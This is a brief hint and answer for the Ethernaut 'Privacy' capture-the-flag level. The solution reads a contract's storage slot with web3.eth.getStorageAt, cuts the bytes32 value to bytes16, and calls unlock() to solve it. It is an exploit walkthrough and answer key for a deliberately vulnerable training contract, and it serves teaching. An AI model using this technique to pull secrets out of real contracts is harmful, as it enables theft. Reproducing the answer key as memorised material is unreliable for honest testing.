# Privacy

**HINT:** Take another look at 8Vault on how you accessed storage. Also look [here to understand more.](https://medium.com/coinmonks/ethernaut-lvl-12-privacy-walkthrough-how-ethereum-optimizes-storage-to-save-space-and-be-less-c9b01ec6adb6)
really help me understand a better.

<details>
<summary>Answer</summary>
<p>

```js
await web3.eth.getStorageAt("0xA14Cd379bCea0cEcd3bBD18C057734EB1B7268Ec", 5)
```
You'll get a hex like:
```
"0xb2ddc56d0346dea7be7879173c362d82d45c9a8673f41643a6aa601fd5e3a507"
```
Then you need to unlock **BUT** notice this is a bytes32 and the unlock function only accepts the first bytes16
```js
await contract.unlock("0xb2ddc56d0346dea7be7879173c362d82")
```
You can then check if its unlocked with:
```js
await contract.locked()
```
Should return false and you can then submit
</p>
</details>